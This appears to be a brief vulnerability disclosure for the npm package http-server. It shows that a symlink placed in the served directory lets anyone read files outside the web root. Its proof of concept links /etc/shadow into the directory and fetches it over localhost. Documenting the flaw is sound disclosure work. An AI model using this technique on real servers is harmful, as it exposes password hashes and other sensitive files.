# Overview

With a symbolically linked file in the working directory, it is possible to read arbitrary files outside of the web root directory, this could include system/user credentials and other sensitive information.

# Proof of Concept

1. Install the http_server: npm install --global http-server
2. Create a symlink file within the directory: 
```
ln -s /etc/shadow test_shadow.html // this test_shadow file can be of any valid extension .txt, .jpg, etc.
```
3. http://localhost:8080/test_shadow.html